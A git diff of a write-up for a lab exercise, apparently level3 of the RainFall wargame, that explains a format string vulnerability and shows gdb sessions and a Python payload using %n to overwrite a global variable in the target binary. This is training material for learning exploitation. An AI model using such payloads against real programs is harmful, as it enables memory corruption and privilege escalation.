@@ -86,24 +86,24 @@ But how ?
 
 ## String format vulnerability
 
-Remember when i said that feeding a non sanitized user input into a `printf` famility function is a very bad idea ? This is a so called **string format vulnerability**. We allow the user of the application to specify the *format string*. By doing so, we allow the user to read process memory, and even writing to it. One can basically do a full dump of a process memory with a good exploit of a string format vulnerability.
+Remember when I mentioned that feeding unsanitized user input into a printf-family function is a very bad idea? This is known as a format string vulnerability. By allowing a user to control the format string, we give them the ability to read and even write **arbitrary memory** within the process. With a well-crafted exploit, an attacker can perform a full *memory dump* of the process.
 
-The behaviour of the C format function is controlled by the format string. The function retrieves the parameters requested by the format string from the stack. Do note that the format string is also in the stack ! This is the first argument of a format function.
+The behavior of C's formatted output functions is controlled by the format string. These functions retrieve the arguments specified in the format string from the stack. Notably, the format string itself is also stored on the stack—it's the first argument passed to the function.
 
-This following input prints 64 32-bit value from the stack :
+For example, the following input prints 64 consecutive 32-bit values from the stack:
 
+```bash
+level3@RainFall:~$ python -c 'print("%08x " * 64)' | ./level3
+00000200 b7fd1ac0 b7ff37d0 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025
 ```
-level3@RainFall:~$ python -c 'print("%x "*64)' | ./level3
-200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 a b7fdcb18 0 0 0 3 f63d4e2e 3f3 0 b7e38938 b7fffe78 b7ff9d5c b7e2fe38
-```
 
-We can see the contents of the buffer filled by `fgets` (our input), also the size of the buffer that was used by the former function, `0x200`.
+From the output, we can see the contents of the buffer filled by `fgets` (our input), as well as the buffer size used by fgets earlier, which in this case is **0x200**.
 
-But we can even write to memory ! Enter the `%n` specifier :
+But it doesn’t stop there—we can also write to memory! This is where the %n format specifier comes into play.
 
->%n is a special format specifier which instead of printing something causes printf() to load the variable pointed by the corresponding argument with a value equal to the y() before the occurrence of %n.
+> %n is a special format specifier that, instead of printing a value, instructs printf to store the number of characters printed so far into the memory location pointed to by the corresponding argument.
 
-We can try inputting just a simple `%n` in our program and see what happends :
+To see this in action, we can try supplying a simple %n as input to our program and observe what happens.
 
 ```
 level3@RainFall:~$ gdb level3 
@@ -132,9 +132,12 @@ eax            0x200	512
 (gdb)
 ```
 
-It segfaults. Analyzing the assembly, it tries to write to memory address `0x200` the value `0x0`. Remember, `0x200` is the first value that was printed using the `%x` specifier. and `0x0` is simply because `printf` has not printed any characters yet.
+We see that the program attempts to write the value **0x0** to memory address **0x200**.
 
-By specifying multiple conversion specifier, we can *advance* the internal stack pointer of `printf` to choose another value on the stack :
+Recall that **0x200** was the first value printed using the %x specifier.
+The value **0x0** is written because printf has not printed any characters before encountering `%n`.
+
+By carefully specifying multiple format specifiers, we can advance printf’s internal stack pointer, allowing us to select and manipulate other values on the stack :
 
 ```
 level3@RainFall:~$ gdb level3 
@@ -181,40 +184,34 @@ edi            0x17	23
 eax            0xdeadbeef	-559038737
 ```
 
-I choosed the format specifier "%x%x%x%n" because we have to *advance* printf's internal stack pointer by 3, so `%n` would write to our `0xDEADBEEF` address.
+I choosed the format specifier `%x%x%x%n` because we have to *advance* printf's internal stack pointer by 3, so `%n` would write to our `0xDEADBEEF` address.
 
-## Putting it together
+## Putting It All Together
 
-- Instead of writing to `0xDEADBEEF`, we can write to the global variable stored at address `0x804988c`.
-- We can use the `%n` specifier to store the numbers of character that printf processed.
-- We need to write the value `0x40` to address `0x804988c`.
+Our goal is to overwrite a global variable located at address `0x804988c` instead of writing to `0xDEADBEEF`.
 
-A character is 1 byte wide. Our exploit need to make `printf` process `0x40 (64)` characters before the `%n` specifier.
+- Use the %n specifier to store the number of characters printf has processed.
+- Ensure printf processes exactly **0x40 (64)** characters before executing `%n`, so that **0x40** is written to `0x804988c`.
 
-- The address is 32 bit, so 4 bytes wide.
-- Using these conversion specifiers `%08x%08x%08x%n` will output `8*3=24` bytes. Note the usage of a *field width* and *padding characters* to make sure our output is constant in size.
+Each character printed counts as 1 byte.
 
-We find how many junk characters we need to fill :
+The memory address is 32-bit, meaning it takes up 4 bytes.
+
+The format string `%08x%08x%08x%n` prints three 8-character hex values, totaling **8 × 3 = 24 bytes**.
+
+To reach 64 characters in total, we calculate the padding needed:
 
 ```
 x + 4 + 24 = 64
-<=> x = 36
+x = 36
 ```
 
-This is the layout of our exploit in the stack and how many characters will be process by `printf` :
-
 ```
-[global variable address][junk characters][specifiers]
-            4                   36             24
+[global variable address][junk characters][format specifiers]
+            4                   36                 24
 ```
 
-Leads to the following python command :
-
-```
-python -c 'print("\x8c\x98\x04\x08" + "#"*36 + "%08x%08x%08x%n")'
-```
-
-Let's try to pipe this command into `level3` with a dummy cat to leave the `stdin` open :
+Using Python to generate the payload `python -c 'print("\x8c\x98\x04\x08" + "#"*36 + "%08x%08x%08x%n")'` :
 
 ```
 level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "#"*36 + "%08x%08x%08x%n")'; cat) | ./level3
